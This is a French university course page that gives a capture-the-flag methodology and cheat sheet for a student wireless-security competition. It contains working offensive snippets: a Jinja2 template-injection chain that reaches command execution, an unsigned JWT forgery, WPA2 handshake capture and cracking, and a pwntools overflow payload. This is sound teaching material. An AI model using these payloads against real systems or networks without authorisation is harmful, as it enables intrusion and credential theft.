---
layout: course
title: "CTF — European Wireless Challenge"
semestre: "S7"
type_cours: "projet"
tags: ["CTF", "pwn", "reverse", "web", "forensics", "cryptographie", "writeup", "sécurité"]
---

## Présentation

Le **CTF (Capture The Flag)** est un format de compétition de cybersécurité où les participants trouvent des "flags" (chaînes de texte au format `EWC{...}`) cachés dans des challenges. L'**European Wireless Challenge (EWC)** est un CTF organisé dans le cadre du S7, centré sur la sécurité des systèmes sans fil et embarqués.

---

## Catégories de challenges

| Catégorie | Description | Outils |
|-----------|-------------|--------|
| **Web** | Vulnérabilités applicatives (SQLi, XSS, SSTI, SSRF) | Burp Suite, sqlmap, curl |
| **Pwn** | Exploitation binaire (buffer overflow, ROP) | pwntools, gdb, ROPgadget |
| **Reverse** | Analyse de binaires sans code source | Ghidra, IDA, gdb |
| **Crypto** | Cryptanalyse, implémentations faibles | Python, CyberChef, SageMath |
| **Forensics** | Analyse de fichiers, mémoire, trafic réseau | Wireshark, Volatility, binwalk |
| **Wireless** | Wi-Fi, BLE, LoRa, SDR | aircrack-ng, Wireshark, GNU Radio |
| **Misc** | Stéganographie, OSINT, scripting | Steghide, exiftool |

---

## Méthodologie générale

```
1. Lire l'énoncé attentivement
         │
         ▼
2. Identifier la catégorie et les indices
         │
         ▼
3. Énumérer (quels fichiers, ports, services ?)
         │
         ▼
4. Formuler une hypothèse d'attaque
         │
         ▼
5. Tester l'hypothèse
         │
    Réussi ?
    ├── Oui → Soumettre le flag
    └── Non → Nouvelle hypothèse (retour étape 4)
```

> En CTF, la persévérance et la méthodologie comptent plus que la connaissance exhaustive. Documenter chaque piste explorée, même les fausses pistes.

---

## Catégorie Web

### Template Injection (SSTI)

```bash
# Test : injecter une expression mathématique
https://target.ctf/page?name={{7*7}}
# Si la réponse contient "49" → SSTI Jinja2/Twig

# Exploitation Jinja2 → RCE
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{ ''.__class__.__mro__[1].__subclasses__()[408]('id', shell=True, stdout=-1).communicate()[0].decode() }}

# Avec Burp Intruder : fuzz avec une wordlist de payloads SSTI
```

### JWT — JSON Web Token

```python
# JWT mal signé (algorithm: none)
import base64, json

# Décoder sans vérification
header_b64 = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"
payload_b64 = "eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ"
fake_jwt = f"{header_b64}.{payload_b64}."

# Brute-force d'une clé faible avec hashcat
# hashcat -m 16500 hash.txt wordlist.txt

# Confusion d'algorithme HS256/RS256
# Si serveur attend RS256 mais accepte HS256 avec la clé publique comme secret
```

---

## Catégorie Crypto

### Chiffrements classiques

```python
# César — décalage de 13 (ROT13)
import codecs
codecs.encode("ENCRYPTED_TEXT", 'rot_13')

# Vigenère — analyse de fréquence
from itertools import cycle

def vigenere_decrypt(ciphertext, key):
    key_cycle = cycle(ord(k) - ord('A') for k in key.upper())
    result = []
    for c in ciphertext.upper():
        if c.isalpha():
            result.append(chr((ord(c) - ord('A') - next(key_cycle)) % 26 + ord('A')))
        else:
            result.append(c)
    return ''.join(result)

# XOR — si clé répétée, Kasiski / Index of Coincidence
ciphertext = bytes.fromhex("1a2b3c...")
key = b"SECRET"
plaintext = bytes(c ^ k for c, k in zip(ciphertext, cycle(key)))
```

### RSA — Attaques classiques CTF

```python
from Crypto.Util.number import inverse, long_to_bytes

# Factorisation si n est petit → factordb.com
# ou si p et q sont proches (Fermat)
import math
def fermat_factor(n):
    a = math.isqrt(n) + 1
    b2 = a*a - n
    while True:
        b = math.isqrt(b2)
        if b*b == b2:
            return a - b, a + b
        a += 1
        b2 = a*a - n

# e = 3 et m petit → cube root attack
import gmpy2
c = int("...", 16)
m, exact = gmpy2.iroot(c, 3)  # Racine cubique entière

# Common modulus attack (même n, deux (e, c) différents avec gcd(e1,e2)=1)
from math import gcd
def extended_gcd(a, b):
    if b == 0:
        return a, 1, 0
    g, x, y = extended_gcd(b, a % b)
    return g, y, x - (a // b) * y

# Déchiffrement final
p, q = fermat_factor(n)
phi = (p - 1) * (q - 1)
d = inverse(e, phi)
m = pow(c, d, n)
print(long_to_bytes(m))
```

---

## Catégorie Forensics

```bash
# Analyse de fichiers inconnus
file suspicious.bin
xxd suspicious.bin | head -20    # Magic bytes
strings suspicious.bin | grep -i "flag\|ewc\|key\|pass"
binwalk suspicious.bin           # Fichiers embarqués
binwalk -e suspicious.bin        # Extraire les fichiers
exiftool image.jpg               # Métadonnées

# Stéganographie
steghide extract -sf image.jpg -p "password"
stegsolve image.png              # Analyse des plans de bits
zsteg image.png                  # LSB steganography
outguess -r image.jpg output.txt

# Analyse de trafic réseau (pcap)
wireshark capture.pcap
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.uri
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name
# Rechercher les flags dans les payloads
tshark -r capture.pcap -T fields -e data.data | xxd -r -p | strings | grep -i ewc
```

---

## Catégorie Wireless

```bash
# Capture et analyse Wi-Fi
airodump-ng wlan0mon -w ctf_capture
# Identifier le BSSID/SSID cible, capturer le handshake WPA2
# Puis : hashcat -m 22000 capture.hc22000 wordlist.txt

# GNU Radio / RTL-SDR — signal radio mystère
gqrx                              # Visualisation spectre
universal_radio_hacker            # Démodulation et analyse de protocoles

# Bluetooth BLE — advertising packets
sudo hcitool lescan
gatttool -b AA:BB:CC:DD:EE:FF -I
  > primary                       # Lister les services
  > char-read-hnd 0x000b           # Lire une caractéristique

# LoRa — analyse avec CatSniffer ou SDR
# Souvent : démodulation des trames, décodage du payload
```

---

## Outils essentiels CTF

```bash
# CyberChef (navigateur) — swiss army knife
# https://gchq.github.io/CyberChef/
# Décode Base64, XOR, ROT13, détecte les formats...

# pwntools — exploitation binaire
from pwn import *
p = process('./vulnerable')
# ou p = remote('ctf.example.com', 1337)
p.recvuntil(b'> ')
payload = b'A' * 72 + p64(win_addr)
p.sendline(payload)
p.interactive()

# Rechercher des gadgets ROP
ROPgadget --binary vuln --rop
ropper -f vuln --search "pop rdi"

# Décompresser / déobfusquer
python3 -c "import zlib,base64; print(zlib.decompress(base64.b64decode('...')))"

# Hashs — identification et crack
hash-identifier "5d41402abc4b2a76b9719d911017c592"
hashcat -m 0 hash.txt rockyou.txt         # MD5
john --wordlist=rockyou.txt hash.txt       # John the Ripper
```

---

## Ressources pour progresser

| Ressource | Description |
|-----------|-------------|
| **PicoCTF** | CTF permanent niveau débutant/intermédiaire |
| **HackTheBox** | Labs pratiques, machines vulnérables |
| **TryHackMe** | Parcours guidés de cybersécurité |
| **CTFtime.org** | Agenda des CTF mondiaux |
| **pwn.college** | Parcours exploitation binaire structuré |
| **CryptoPals** | Challenges crypto progressifs |
| **PortSwigger Web Academy** | Labs OWASP gratuits |
